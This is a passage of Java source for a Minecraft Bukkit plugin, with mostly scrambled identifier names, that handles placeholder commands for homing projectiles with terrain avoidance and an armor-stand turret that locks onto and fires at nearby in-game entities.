                                } else {
                                    destroyedTargets.spawnParticle(ignoring, tntLOc, INT3, I, I, I, unused);
                                }
                            }
                        }
                    }
                    timer += month;
                }
            }.runTaskTimer(
                    Bukkit.getPluginManager().getPlugin(ppi),
                    ihearyounow, month
            );

            return returnvalue;
        }


        if (f1.startsWith(itenwoipwfnaidun4w)) {
            wm(f2, ipendfofpiwdnoo43iwund);
            String[] parts = f1.substring(itenwoipwfnaidun4w.length()).split(keep);
            if (parts.length != xtxtxt) {
                return tneeiond4 + f1;
            }

            try {
                UUID iedono3iwepd = UUID.fromString(parts[I]);
                UUID fnwiteniwefdn = UUID.fromString(parts[INT3]);
                double eisdtniepwf = Double.parseDouble(parts[mill2]);
                UUID nebdoifwpnd = UUID.fromString(parts[ccp]);
                int stmkenwp = Integer.parseInt(parts[INT7]);
                int kfne2dfw = Integer.parseInt(parts[xm]);

                Entity kpwdkb = Bukkit.getEntity(iedono3iwepd);
                Entity revnhdwnefpi = Bukkit.getEntity(fnwiteniwefdn);

                if (kpwdkb == null || revnhdwnefpi == null) {
                    return kdienwfp; // No valid entities
                }
                if (!kpwdkb.getWorld().equals(revnhdwnefpi.getWorld())) {
                    return midenwyudp4; // Different worlds
                }

                Location iednoupfind = kpwdkb.getLocation();
                Location ybwnhywopnbyunwbp = revnhdwnefpi.getLocation();

                double iekiekienwdfp = iednoupfind.distance(ybwnhywopnbyunwbp);

                final Projectile nkmiekdiepfwd;
                if (kpwdkb instanceof Projectile) {
                    nkmiekdiepfwd = (Projectile) kpwdkb;
                } else {
                    return wfudnofypundap;
                }

                // Create async tracking task
                new BukkitRunnable() {
                    int kiewkfdiew = I;

                    @Override
                    public void run() {
                        // Cancel conditions
                        if (kiewkfdiew >= kfne2dfw) {
                            f122.remove(revnhdwnefpi.getUniqueId());
                            cancel();
                            return;
                        }
                        if (nkmiekdiepfwd.isDead() || !nkmiekdiepfwd.isValid()) {
                            f122.remove(revnhdwnefpi.getUniqueId());
                            cancel();
                            return;
                        }
                        if (revnhdwnefpi.isDead() || !revnhdwnefpi.isValid()) {
                            f122.remove(revnhdwnefpi.getUniqueId());
                            cancel();
                            return;
                        }
                        if (!revnhdwnefpi.getWorld().equals(nkmiekdiepfwd.getWorld())) {
                            f122.remove(revnhdwnefpi.getUniqueId());
                            cancel();
                            return;
                        }

                        Location iedkwipednpwfdne = nkmiekdiepfwd.getLocation();
                        // Target midsection
                        Location iefwdiwefpd = revnhdwnefpi.getLocation().clone().add(I, revnhdwnefpi.getHeight() / INT7
                                , I);

                        Vector iednwfied;
                        Vector eiwfntiewfntefwt = revnhdwnefpi.getVelocity();


                        if(Math.abs(eiwfntiewfntefwt.getY() + seenher) < childingdanger) eiwfntiewfntefwt.setY(I);
                        // Check for gravity drag Y velocity (~ -0.0784) and no X/Z movement
                        if (Math.abs(eiwfntiewfntefwt.getY() + seenher) < childingdanger && Math.abs(eiwfntiewfntefwt.getX()) < childingdanger && Math.abs(eiwfntiewfntefwt.getZ()) < childingdanger) {
                            // Use manual tracking fallback
                            Vector eiwfndiwfendfw = f122.get(revnhdwnefpi.getUniqueId());
                            if (eiwfndiwfendfw != null) {
                                iednwfied = eiwfndiwfendfw.subtract(iedkwipednpwfdne.toVector());
                            } else {
                                f122.put(revnhdwnefpi.getUniqueId(), iefwdiwefpd.toVector());
                                iednwfied = iefwdiwefpd.toVector().subtract(iedkwipednpwfdne.toVector());
                            }
                        } else {
                            // Clear manual tracking since target is moving
                            f122.remove(revnhdwnefpi.getUniqueId());
                            iednwfied = iefwdiwefpd.toVector().subtract(iedkwipednpwfdne.toVector());
                        }

                        double iewpdniewfndp = eisdtniepwf;
                        double a = eiwfntiewfntefwt.dot(eiwfntiewfntefwt) - iewpdniewfndp * iewpdniewfndp;
                        double b = mill2 * iednwfied.dot(eiwfntiewfntefwt);
                        double c = iednwfied.dot(iednwfied);

                        double discriminant = b * b - INT7 * a * c;
                        Vector wfyutndywfudnwf;

                        if (discriminant < I || a == I) {
                            wfyutndywfudnwf = iednwfied.normalize().multiply(iewpdniewfndp);
                        } else {
                            double sqrtDisc = Math.sqrt(discriminant);
                            double t1 = (-b - sqrtDisc) / (mill2 * a);
                            double t2 = (-b + sqrtDisc) / (mill2 * a);
                            double t;
                            if (t1 > I && t2 > I) {
                                t = Math.min(t1, t2);
                            } else if (t1 > I) {
                                t = t1;
                            } else if (t2 > I) {
                                t = t2;
                            } else {
                                wfyutndywfudnwf = iednwfied.normalize().multiply(iewpdniewfndp);
                                nkmiekdiepfwd.setVelocity(wfyutndywfudnwf);
                                kiewkfdiew += stmkenwp;
                                return;
                            }

                            Vector wdkwpfoidnwofpiudn = iefwdiwefpd.toVector().add(eiwfntiewfntefwt.clone().multiply(t));
                            wfyutndywfudnwf = wdkwpfoidnwofpiudn.subtract(iedkwipednpwfdne.toVector()).normalize().multiply(iewpdniewfndp);
                        }

                        // Terrain Avoidance: Raytrace 5 ticks ahead
                        Location wpdnwyfupndwfp = iedkwipednpwfdne.clone();
                        Vector wpdnkywnpkd = wfyutndywfudnwf.clone().normalize();
                        double fiemiwefmdk = wfyutndywfudnwf.length() * xm;

                        RayTraceResult wiefndiwfndyuwfnb = wpdnwyfupndwfp.getWorld().rayTraceBlocks(
                                wpdnwyfupndwfp,
                                wpdnkywnpkd,
                                fiemiwefmdk,
                                FluidCollisionMode.NEVER,
                                NEW_VALUE1
                        );

                        Set<Material> indyuwnfpydunwf = wuyfdnyuwfndyufwnd(); // Make sure you have this helper
                        boolean wfyudnywufndt = wiefndiwfndyuwfnb != null && wiefndiwfndyuwfnb.getHitBlock() != null &&
                                !indyuwnfpydunwf.contains(wiefndiwfndyuwfnb.getHitBlock().getType());

                        if (wfyudnywufndt) {
                            Vector dwfundyuwfndyouwfndofwyundowyfudnfwydun = wfyutndywfudnwf;
                            double ewbkywpnb = -INT3;
                            for (int pitch = I; pitch <= wdnywfundywfudn; pitch += xm) {
                                Vector uwpndyuwpnd = pitchVectorUpwards(wfyutndywfudnwf.clone(), Math.toRadians(pitch)).normalize().multiply(iewpdniewfndp);
                                Vector oienfdp = uwpndyuwpnd.clone().normalize();
                                RayTraceResult fobhap = wpdnwyfupndwfp.getWorld().rayTraceBlocks(
                                        wpdnwyfupndwfp,
                                        oienfdp,
                                        uwpndyuwpnd.length() * xm,
                                        FluidCollisionMode.NEVER,
                                        NEW_VALUE1
                                );
                                boolean idenwkpidnwuifpdn = fobhap == null || fobhap.getHitBlock() == null ||
                                        indyuwnfpydunwf.contains(fobhap.getHitBlock().getType());
                                if (idenwkpidnwuifpdn) {
                                    double wfednywfundyfwu = pitch;
                                    double sciwfdntkifwednre = wyundywufndywufpndywuf - wfednywfundyfwu;
                                    if (sciwfdntkifwednre > ewbkywpnb) {
                                        ewbkywpnb = sciwfdntkifwednre;
                                        dwfundyuwfndyouwfndofwyundowyfudnfwydun = uwpndyuwpnd;
                                    }
                                }
                            }
                            wfyutndywfudnwf = dwfundyuwfndyouwfndofwyundowyfudnfwydun;
                        }

                        nkmiekdiepfwd.setVelocity(wfyutndywfudnwf);
                        kiewkfdiew += stmkenwp;
                    }

                    protected Set<Material> wuyfdnyuwfndyufwnd() {
                        return EnumSet.of(
                                Material.ACTIVATOR_RAIL,
                                Material.AIR,
                                Material.BAMBOO,
                                Material.BLACK_BANNER,
                                Material.BLUE_BANNER,
                                Material.BEETROOT_SEEDS,
                                Material.STONE_BUTTON,
                                Material.OAK_BUTTON,
                                Material.BIRCH_BUTTON,
                                Material.SPRUCE_BUTTON,
                                Material.JUNGLE_BUTTON,
                                Material.DARK_OAK_BUTTON,
                                Material.ACACIA_BUTTON,
                                Material.MANGROVE_BUTTON,
                                Material.CHERRY_BUTTON,
                                Material.CRIMSON_BUTTON,
                                Material.WARPED_BUTTON,
                                Material.LIGHT_BLUE_BANNER,
                                Material.BROWN_BANNER,
                                Material.CYAN_BANNER,
                                Material.GRAY_BANNER,
                                Material.GREEN_BANNER,
                                Material.LIGHT_GRAY_BANNER,
                                Material.LIME_BANNER,
                                Material.MAGENTA_BANNER,
                                Material.ORANGE_BANNER,
                                Material.PINK_BANNER,
                                Material.PURPLE_BANNER,
                                Material.RED_BANNER,
                                Material.WHITE_BANNER,
                                Material.YELLOW_BANNER,
                                Material.CARROTS,
                                Material.CHORUS_FLOWER,
                                Material.CHORUS_PLANT,
                                Material.COBWEB,
                                Material.COCOA,
                                Material.BRAIN_CORAL,
                                Material.BUBBLE_CORAL,
                                Material.FIRE_CORAL,
                                Material.HORN_CORAL,
                                Material.TUBE_CORAL,
                                Material.BRAIN_CORAL_FAN,
                                Material.BUBBLE_CORAL_FAN,
                                Material.FIRE_CORAL_FAN,
                                Material.HORN_CORAL_FAN,
                                Material.TUBE_CORAL_FAN,
                                Material.DEAD_BUSH,
                                Material.DETECTOR_RAIL,
                                Material.END_GATEWAY,
                                Material.END_PORTAL,
                                Material.FIRE,
                                Material.DANDELION,
                                Material.POPPY,
                                Material.BLUE_ORCHID,
                                Material.ALLIUM,
                                Material.AZURE_BLUET,
                                Material.RED_TULIP,
                                Material.ORANGE_TULIP,
                                Material.WHITE_TULIP,
                                Material.PINK_TULIP,
                                Material.OXEYE_DAISY,
                                Material.CORNFLOWER,
                                Material.LILY_OF_THE_VALLEY,
                                Material.WITHER_ROSE,
                                Material.FLOWER_POT,
                                Material.FROGSPAWN,
                                Material.WARPED_FUNGUS,
                                Material.CRIMSON_FUNGUS,
                                Material.GLOW_BERRIES,
                                Material.GLOW_LICHEN,
                                Material.SHORT_GRASS,

                                Material.HANGING_ROOTS,
                                Material.PLAYER_HEAD,
                                Material.SKELETON_SKULL,
                                Material.CREEPER_HEAD,
                                Material.WITHER_SKELETON_SKULL,
                                Material.ZOMBIE_HEAD,
                                Material.DRAGON_HEAD,
                                Material.PIGLIN_HEAD,
                                Material.KELP,
                                Material.LADDER,
                                Material.LAVA,
                                Material.LEVER,
                                Material.LIGHT,
                                Material.LILY_PAD,
                                Material.MANGROVE_PROPAGULE,
                                Material.MELON_SEEDS,
                                Material.MOSS_CARPET,
                                Material.RED_MUSHROOM,
                                Material.BROWN_MUSHROOM,
                                Material.NETHER_PORTAL,
                                Material.NETHER_SPROUTS,
                                Material.NETHER_WART,
                                Material.PINK_PETALS,
                                Material.PITCHER_PLANT,
                                Material.PITCHER_POD,
                                Material.POTATOES,
                                Material.POWDER_SNOW,
                                Material.POWERED_RAIL,
                                Material.OAK_PRESSURE_PLATE,
                                Material.BIRCH_PRESSURE_PLATE,
                                Material.SPRUCE_PRESSURE_PLATE,
                                Material.JUNGLE_PRESSURE_PLATE,
                                Material.DARK_OAK_PRESSURE_PLATE,
                                Material.ACACIA_PRESSURE_PLATE,
                                Material.MANGROVE_PRESSURE_PLATE,
                                Material.CHERRY_PRESSURE_PLATE,
                                Material.CRIMSON_PRESSURE_PLATE,
                                Material.WARPED_PRESSURE_PLATE,
                                Material.STONE_PRESSURE_PLATE,
                                Material.LIGHT_WEIGHTED_PRESSURE_PLATE,
                                Material.HEAVY_WEIGHTED_PRESSURE_PLATE,
                                Material.PUMPKIN_SEEDS,
                                Material.RAIL,
                                Material.COMPARATOR,
                                Material.REDSTONE_WIRE,
                                Material.REPEATER,
                                Material.REDSTONE_TORCH,
                                Material.REDSTONE_WALL_TORCH,
                                Material.OAK_SAPLING,
                                Material.BIRCH_SAPLING,
                                Material.SPRUCE_SAPLING,
                                Material.JUNGLE_SAPLING,
                                Material.DARK_OAK_SAPLING,
                                Material.ACACIA_SAPLING,
                                Material.CHERRY_SAPLING,
                                Material.SCULK_VEIN,
                                Material.SEA_PICKLE,
                                Material.SEAGRASS,
                                Material.SHORT_GRASS,
                                Material.DEAD_BUSH, // Re-listed for redundancy
                                Material.OAK_SIGN,
                                Material.BIRCH_SIGN,
                                Material.SPRUCE_SIGN,
                                Material.JUNGLE_SIGN,
                                Material.DARK_OAK_SIGN,
                                Material.ACACIA_SIGN,
                                Material.CHERRY_SIGN,
                                Material.MANGROVE_SIGN,
                                Material.CRIMSON_SIGN,
                                Material.WARPED_SIGN,
                                Material.SMALL_DRIPLEAF,
                                Material.SNOW,
                                Material.SPORE_BLOSSOM,
                                Material.STRING,
                                Material.STRUCTURE_VOID,
                                Material.SUGAR_CANE,
                                Material.SWEET_BERRY_BUSH,
                                Material.TORCH,
                                Material.TORCHFLOWER_SEEDS,
                                Material.TRIPWIRE_HOOK,
                                Material.TURTLE_EGG,
                                Material.TWISTING_VINES,
                                Material.VINE,
                                Material.WATER,
                                Material.WEEPING_VINES,
                                Material.WHEAT_SEEDS,
                                Material.WHITE_TULIP
                        );

                    }

                }.runTaskTimer(Bukkit.getPluginManager().getPlugin(ppi), ihearyounow, stmkenwp);

                String fdnyuwn2fdyufwn = (revnhdwnefpi instanceof Player) ? revnhdwnefpi.getName() : revnhdwnefpi.getType().name();
                return String.format(cryingiwenftipfwnt, fdnyuwn2fdyufwn, iekiekienwdfp);

            } catch (Exception e) {
                e.printStackTrace();
                return kdienwfp;
            }
        }

        if (f1.startsWith(tuywnfydunwfyudn)) {

            String[] mfiwetdmfiewdtm = f1.substring(tuywnfydunwfyudn.length()).split(keep);
            wm(f2, wtdyuwnfdyunwf);
            // You access up to parts[19]; require at least 20
            if (mfiwetdmfiewdtm.length < odafuwidnowfidun) return iendie2nd;

            try {
                String worldName = mfiwetdmfiewdtm[I];
                int iwfniun = Integer.parseInt(mfiwetdmfiewdtm[INT3]);
                int diwenfdiewf = Integer.parseInt(mfiwetdmfiewdtm[mill2]);
                int wfdnwyfudnw = Integer.parseInt(mfiwetdmfiewdtm[ccp]);
                double kdiwfedk = Double.parseDouble(mfiwetdmfiewdtm[INT7]);
                String wfuydnwyfun = mfiwetdmfiewdtm[xm];
                double wfouytnwoyund = Double.parseDouble(mfiwetdmfiewdtm[xtxtxt]);
                String wfyudnyufwnd = mfiwetdmfiewdtm[suppose];
                String kwfnktywfnt = mfiwetdmfiewdtm[yuwfndgyuwfnd];
                int wyfnptyouwnfp = Integer.parseInt(mfiwetdmfiewdtm[oiwfndtoyu42nd24]);     // ticks
                int wdnhywfudn = Integer.parseInt(mfiwetdmfiewdtm[low]);    // ticks
                int fwyudnywfund = Integer.parseInt(mfiwetdmfiewdtm[yfpdunwyupnd]);    // ticks
                double wfmypenfwp = Double.parseDouble(mfiwetdmfiewdtm[fdhkypfwd]);
                Particle mewfitnfw = Particle.valueOf(mfiwetdmfiewdtm[yufdaywfudnwfd].toUpperCase(Locale.ROOT));
                double oyuwfndoyuwfdn = Double.parseDouble(mfiwetdmfiewdtm[14]);
                boolean wduyfwnoduynfw = pd3ipdn34d.equals(mfiwetdmfiewdtm[15].trim()) || Boolean.parseBoolean(mfiwetdmfiewdtm[15]);
                String wfyudnfywund = mfiwetdmfiewdtm[INT4];
                float wdfyundwfd = Float.parseFloat(mfiwetdmfiewdtm[17]);
                float fwtyunwftfw = Float.parseFloat(mfiwetdmfiewdtm[18]);
                float wfktywfkduyfwkd = Float.parseFloat(mfiwetdmfiewdtm[19]);
                List<String> doyunwfoydunfwd = Arrays.asList(mfiwetdmfiewdtm).subList(odafuwidnowfidun, mfiwetdmfiewdtm.length);

                World wfdunwfyudn = Bukkit.getWorld(worldName);
                if (wfdunwfyudn == null) return wiodtnowiupd;

                final Location wfdemwyfden = new Location(wfdunwfyudn, iwfniun + debtsoff, diwenfdiewf + wfopdwfnodowfin, wfdnwyfudnw + debtsoff);


                org.bukkit.Location dtnyounyuwfdn = wfdemwyfden;
                double wduynfwydunwfoydunw = low;
                String wdfkywfindywfud = wfodwfdkywf4d;


                double yuwftnouynfwt = wduynfwydunwfoydunw * wduynfwydunwfoydunw;
                for (org.bukkit.entity.Player fwtwyfdynu : wfdunwfyudn.getPlayers()) {
                    if (fwtwyfdynu.getLocation().distanceSquared(dtnyounyuwfdn) <= yuwftnouynfwt) {
                        wm(fwtwyfdynu, wdfkywfindywfud);
                    }
                }
                final double wtmyufnwtyunfwt = kdiwfedk * kdiwfedk;

                ArmorStand wtnyufwtnfwtyun = wfdunwfyudn.getNearbyEntities(wfdemwyfden, mill2, mill2, mill2).stream()
                        .filter(ArmorStand.class::isInstance)
                        .map(ArmorStand.class::cast)
                        .filter(e -> e.getScoreboardTags().contains(iersdienrodyfwunpd))
                        .findFirst()
                        .orElse(null);
                if (wtnyufwtnfwtyun == null) return twoiaefndoiwfudnfoyudn;

                // --- multischeduling guard ---
                UUID wfpydnuopfwyudn = wtnyufwtnfwtyun.getUniqueId();
                BukkitTask wyfydunywufdno = f116.get(wfpydnuopfwyudn);
                long extendMs = Math.max(dtnowifepdnaowifudn, wyfnptyouwnfp * dtnowifepdnaowifudn); // ticks -> ms (20t = 1s)
                // --------------------------------

                Set<String> wyfdnoywfundoywfund = wtnyufwtnfwtyun.getScoreboardTags();

                // Helper: find closest valid target WITH VLOS (used only on acquisition/refresh checks)
                java.util.function.Supplier<LivingEntity> wfitonfwutnwoyufnd = () -> {
                    LivingEntity wofdnwofyudnwfyudn = null;
                    double ofwutdnofywudn = wtmyufnwtyunfwt;
                    for (Entity ifntoiwfundotyu : wfdunwfyudn.getNearbyEntities(wfdemwyfden, kdiwfedk, kdiwfedk, kdiwfedk)) {
                        if (!(ifntoiwfundotyu instanceof LivingEntity le) || ifntoiwfundotyu.isDead()) continue;
                        if (!ifntoiwfundotyu.getWorld().equals(wfdunwfyudn)) continue;
                        if (!ExampleExpansionUtils.iearnsvoienrositwf(ifntoiwfundotyu, wfyudnyufwnd, HMsetnoy2un2yundt, kwfnktywfnt)) continue;
                        if (ExampleExpansionUtils.ytwunfoyutn4(ifntoiwfundotyu, wyfdnoywfundoywfund)) continue;

                        Location wofudnowfyund = le.getLocation().clone().add(I, le.getHeight() / whatkindofadulthood, I);
                        double dwoyfuwndoywfund = wofudnowfyund.distanceSquared(wfdemwyfden);
                        if (dwoyfuwndoywfund > ofwutdnofywudn) continue;

                        // VLOS check at acquisition/refresh only
                        if (!ExampleExpansionUtils.wodyuwnfdyuwfn(wfdemwyfden, wofudnowfyund)) continue;

                        wofdnwofyudnwfyudn = le;
                        ofwutdnofywudn = dwoyfuwndoywfund;
                    }
                    return wofdnwofyudnwfyudn;
                };

                // ---- Decision flow per your spec ----
                if (wyfydunywufdno != null && !wyfydunywufdno.isCancelled()) {
                    // Turret is already active: check for a NEW closest valid target IN VLOS
                    LivingEntity wdnoyuwfndoyuwfn = wfitonfwutnwoyufnd.get();

                    if (wdnoyuwfndoyuwfn != null) {
                        // Has lock & valid target in VLOS -> reset timer and retarget to the closest valid target
                        f117.put(wfpydnuopfwyudn, System.currentTimeMillis() + extendMs);
                        f118.computeIfAbsent(wfpydnuopfwyudn, k -> new AtomicReference<>())
                                .set(wdnoyuwfndoyuwfn);
                        wdouywndoywufnd.put(wfdemwyfden, wdnoyuwfndoyuwfn.getUniqueId());
                        return wdnoyuwfndoyuwfn.getUniqueId().toString() + ofwuandouwfynd + wdnoyuwfndoyuwfn.getVelocity();
                    } else {
                        // Has lock & NO new valid targets in VLOS -> keep firing current lock; DO NOT reset timer
                        return towfyuandoywfun;
                    }
                }

                // Not active: try to acquire the closest valid target IN VLOS
                LivingEntity wofduynwfyudn = wfitonfwutnwoyufnd.get();
                if (wofduynwfyudn == null) {
                    return wofudnaoywfudn;
                }

                // Lock it and start one repeating task
                wdouywndoywufnd.put(wfdemwyfden, wofduynwfyudn.getUniqueId());
                f117.put(wfpydnuopfwyudn, System.currentTimeMillis() + extendMs);
                AtomicReference<LivingEntity> dwoyudnowyufpdnyuyn = new AtomicReference<>(wofduynwfyudn);
                f118.put(wfpydnuopfwyudn, dwoyudnowyufpdnyuyn);

                BukkitRunnable runner = new BukkitRunnable() {
                    private void cleanupAndCancel() {
                        wdouywndoywufnd.remove(wfdemwyfden);
                        f116.remove(wfpydnuopfwyudn);
                        f117.remove(wfpydnuopfwyudn);
                        f118.remove(wfpydnuopfwyudn);
                        cancel();
                    }

                    @Override
                    public void run() {
                        // End when the deadline expires
                        Long wdfynwfoydun = f117.get(wfpydnuopfwyudn);
                        if (wdfynwfoydun == null || System.currentTimeMillis() >= wdfynwfoydun) {
                            cleanupAndCancel();
                            return;
                        }

                        LivingEntity towufndfwyun = dwoyudnowyufpdnyuyn.get();
                        if (towufndfwyun == null || towufndfwyun.isDead() || !towufndfwyun.getWorld().equals(wfdunwfyudn)) {
                            // Current target no longer valid -> end (no mid-fight reacquisition)
                            cleanupAndCancel();
                            return;
                        }

                        // NO VLOS checks during firing; can shoot through blocks
                        Location owdyunfwodyun = towufndfwyun.getLocation().clone().add(I, towufndfwyun.getHeight() / whatkindofadulthood, I);

                        // Compute velocity
                        Vector wfodienwfd;
                        if (wduyfwnoduynfw) {
                            Location mtwfyutnwf = towufndfwyun.getLocation();
                            mtwfyutnwf.setY(mtwfyutnwf.getY() + towufndfwyun.getHeight() / whatkindofadulthood);
                            Vector twyofuntyfuwntfwyunt = mtwfyutnwf.toVector().subtract(wfdemwyfden.toVector());
                            Vector twyfuntoyfwunt = towufndfwyun.getVelocity();
                            UUID twofyutnfwoyutnwfoyutn = towufndfwyun.getUniqueId();

                            boolean oeintwfat = Math.abs(twyfuntoyfwunt.getY() + seenher) < childingdanger;
                            boolean kidtwfenkd = Math.abs(twyfuntoyfwunt.getX()) < childingdanger;
                            boolean wfktyuwnft = Math.abs(twyfuntoyfwunt.getZ()) < childingdanger;

                            if (kidtwfenkd && wfktyuwnft) {
                                Location twfyutnwofutn = dwofundoywfund.get(twofyutnfwoyutnwfoyutn);
                                if (twfyutnwofutn != null) {
                                    Vector yquwntyunsr = mtwfyutnwf.toVector().subtract(twfyutnwofutn.toVector());
                                    twyfuntoyfwunt = yquwntyunsr.multiply(okacyyool); // tunable
                                } else {
                                    twyfuntoyfwunt = new Vector(I, I, I);
                                }
                                dwofundoywfund.put(twofyutnfwoyutnwfoyutn, mtwfyutnwf.clone());
                            } else {
                                dwofundoywfund.remove(twofyutnfwoyutnwfoyutn);
                                if (oeintwfat && kidtwfenkd) twyfuntoyfwunt.setY(I);
                            }

                            double douwfndywofu = wfouytnwoyund;
                            double a = twyfuntoyfwunt.dot(twyfuntoyfwunt) - douwfndywofu * douwfndywofu;
                            double wyodunfwdoyu = mill2 * twyofuntyfuwntfwyunt.dot(twyfuntoyfwunt);
                            double c = twyofuntyfuwntfwyunt.dot(twyofuntyfuwntfwyunt);
                            double twoyfutnfwoyutdn = wyodunfwdoyu * wyodunfwdoyu - INT7 * a * c;

                            if (twoyfutnfwoyutdn < I || a == I) {
                                wfodienwfd = twyofuntyfuwntfwyunt.normalize().multiply(douwfndywofu);
                            } else {
                                double dfidnwfd = Math.sqrt(twoyfutnfwoyutdn);
                                double rikers = (-wyodunfwdoyu - dfidnwfd) / (mill2 * a);
                                double oewfndoyuwfnd = (-wyodunfwdoyu + dfidnwfd) / (mill2 * a);
                                double dwfouwfndowuynd = rikers > I ? rikers : (oewfndoyuwfnd > I ? oewfndoyuwfnd : -INT3);
                                if (dwfouwfndowuynd <= I) {
                                    wfodienwfd = twyofuntyfuwntfwyunt.normalize().multiply(douwfndywofu);
                                } else {
                                    Vector wfoyudnawofyudhawofpyldhzwyufpadhlwlfpdhe = mtwfyutnwf.toVector().add(twyfuntoyfwunt.clone().multiply(dwfouwfndowuynd));
                                    wfodienwfd = wfoyudnawofyudhawofpyldhzwyufpadhlwlfpdhe.subtract(wfdemwyfden.toVector()).normalize().multiply(douwfndywofu);
                                }
                            }
                        } else {
                            wfodienwfd = owdyunfwodyun.toVector().subtract(wfdemwyfden.toVector()).normalize().multiply(wfouytnwoyund);
                        }

                        Entity owfdounwofyudn = wfdunwfyudn.spawnEntity(wfdemwyfden, EntityType.valueOf(wfuydnwyfun.toUpperCase(Locale.ROOT)));
                        owfdounwofyudn.setVelocity(wfodienwfd);
                        owfdounwofyudn.setCustomNameVisible(arsdienwdhw);
                        owfdounwofyudn.setSilent(NEW_VALUE1);
                        owfdounwofyudn.setGravity(arsdienwdhw);

                        // Use your plugin instance if you have it; keeping PlaceholderAPI per your original
                        Bukkit.getScheduler().runTaskLater(
                                Bukkit.getPluginManager().getPlugin(ppi),
                                () -> { if (owfdounwofyudn.isValid() && !owfdounwofyudn.isDead()) owfdounwofyudn.remove(); },
                                wdnhywfudn
                        );

                        if (owfdounwofyudn instanceof Arrow arrow) arrow.setDamage(wfmypenfwp);

                        if (kwfnktywfnt != null && !kwfnktywfnt.isEmpty()) {
                            try {
                                UUID oduynwoyun = UUID.fromString(kwfnktywfnt);
                                ProjectileSource woftunwyfoutn = Bukkit.getPlayer(oduynwoyun);
                                if (owfdounwofyudn instanceof Projectile p && woftunwyfoutn != null) {
                                    p.setShooter(woftunwyfoutn);
                                }
                            } catch (IllegalArgumentException ignored) { /* bad UUID */ }
                        }

                        owfdounwofyudn.setMetadata(wdynuwfyudnywufand,
                                new FixedMetadataValue(Bukkit.getPluginManager().getPlugin(ppi), wfmypenfwp));
                        for (String owfudnowufydn : doyunwfoydunfwd) owfdounwofyudn.addScoreboardTag(owfudnowufydn);

                        // Beam (no VLOS; purely visual)
                        Vector wfodeinwoufdn = owdyunfwodyun.toVector().subtract(wfdemwyfden.toVector()).normalize();
                        double dwfoudnwfoyud = wfdemwyfden.distance(owdyunfwodyun);
                        for (double wdfkwedik = I; wdfkwedik <= dwfoudnwfoyud; wdfkwedik += oyuwfndoyuwfdn) {
                            Location tdowfyundofywun = wfdemwyfden.clone().add(wfodeinwoufdn.clone().multiply(wdfkwedik));
                            wfdunwfyudn.spawnParticle(mewfitnfw, tdowfyundofywun, INT3);
                        }

                        wtnyufwtnfwtyun.teleport(
                                wtnyufwtnfwtyun.getLocation().setDirection(
                                        towufndfwyun.getLocation().toVector().subtract(wtnyufwtnfwtyun.getLocation().toVector())
                                )
                        );
                        for (Player wodufnwdouyn : Bukkit.getOnlinePlayers()) {
                            if (!wodufnwdouyn.getWorld().equals(wfdunwfyudn)) continue;
                            if (wodufnwdouyn.getLocation().distanceSquared(wfdemwyfden) <= wdfyundwfd * wdfyundwfd) {
                                wodufnwdouyn.playSound(wfdemwyfden, wfyudnfywund, SoundCategory.AMBIENT, wfktywfkduyfwkd, fwtyunwftfw);
                            }
                        }
                    }
                };

                int ofwdndyu = Math.max(INT3, fwyudnywfund);
                BukkitTask dkwifwnkd = runner.runTaskTimer(Bukkit.getPluginManager().getPlugin(ppi), ihearyounow, ofwdndyu);
                f116.put(wfpydnuopfwyudn, dkwifwnkd);

                return wofduynwfyudn.getUniqueId().toString() + ofwuandouwfynd + wofduynwfyudn.getVelocity();

            } catch (Exception e) {
                e.printStackTrace();
                return wofudnaoywfudn;
            }
        }






        if (f1.startsWith(fdfopudnyafupdn)) {

            
            
            
            String[] parts = f1.substring(xm).split(wyfudnoawfyudno);
            if (parts.length != mill2) {
                return fwpdonufpdyufanpd;
            }
            try {
                UUID viewerUUID = UUID.fromString(parts[I]);
                
                
                
                UUID wdkfnpidkw = UUID.fromString(parts[INT3]);
                Player wfdhywufdh = Bukkit.getPlayer(viewerUUID);
                if (wfdhywufdh == null || !wfdhywufdh.isOnline()) return op4ydhnfaoypudn;
                wm(wfdhywufdh, ydfnfpoyrudn);
                f1(wfdhywufdh, wdkfnpidkw);
                return pwoyfdunowypfuadn;
            } catch (IllegalArgumentException ex) {
                return wfuyntdywfupadh;
            }
        }

        if (f1.startsWith(yfpwduhywuhdp)) {
            String[] dwinyurdns = f1.substring(xm).split(wyfudnoawfyudno);
            if (dwinyurdns.length != mill2) {
                return pdonfapyudn;
            }
            try {
                UUID wfiudnofwyd = UUID.fromString(dwinyurdns[I]);
                UUID tdwfkindfw = UUID.fromString(dwinyurdns[INT3]);
                Player wyfdhfwyd = Bukkit.getPlayer(wfiudnofwyd);
                if (wyfdhfwyd == null || !wyfdhfwyd.isOnline()) return op4ydhnfaoypudn;
                wm(wyfdhfwyd, pdyunpfwyd);
                f2(wyfdhfwyd, tdwfkindfw);
                return dyfpnwoyufpn;
            } catch (IllegalArgumentException ex) {
                return wfuyntdywfupadh;
            }
        }

        if (f1.startsWith(fydnayfpudhn)) {
            String[] iwfnpiefrn = f1.substring(xm).split(wyfudnoawfyudno);
            if (iwfnpiefrn.length != mill2) {
                return wfduynwfydaun;
            }
            try {
                UUID wdyuwfhpdyuwh = UUID.fromString(iwfnpiefrn[I]);
                String[] ypdnofapyudn = iwfnpiefrn[INT3].split(wfdunyunda);
                if (ypdnofapyudn.length != INT7) return duynwyfpaudnwfp;
                String wftdywnfdyu = ypdnofapyudn[I];
                int wfdinywfud = Integer.parseInt(ypdnofapyudn[INT3]);
                int wfuptnfywp = Integer.parseInt(ypdnofapyudn[mill2]);
                int fwidhywufd = Integer.parseInt(ypdnofapyudn[ccp]);
                Player fwdyhwfydu = Bukkit.getPlayer(wdyuwfhpdyuwh);
                
                if (fwdyhwfydu == null || !fwdyhwfydu.isOnline()) return op4ydhnfaoypudn;
                wm(fwdyhwfydu, wdpyunwpfydunpd);
                f1(fwdyhwfydu, wftdywnfdyu, wfdinywfud, wfuptnfywp, fwidhywufd);
                return yuwndyuwpdn;
            } catch (IllegalArgumentException ex) {
                return wfydunwfyudn;
            }
        }







        if (f1.startsWith(wfydnywfpudn)) {
            String[] dywufndo = f1.substring(wfydnywfpudn.length()).split(keep);
            if (dywufndo.length < oiwfndtoyu42nd24 || dywufndo.length > yfpdunwyupnd) return wyfudnywfud;

            // Parse parameters
            String ywfydnwfyud, ydunwfydun, wfdnfwhyd, wfsthywuft = null;
            double dwfd, sviwn, fwdhwf, srtn, aosduhn, arosdun;
            float wfyudnywfund = idwfpndywud;

            try {
                ywfydnwfyud       = dywufndo[I];
                dwfd        = Double.parseDouble(dywufndo[INT3]);
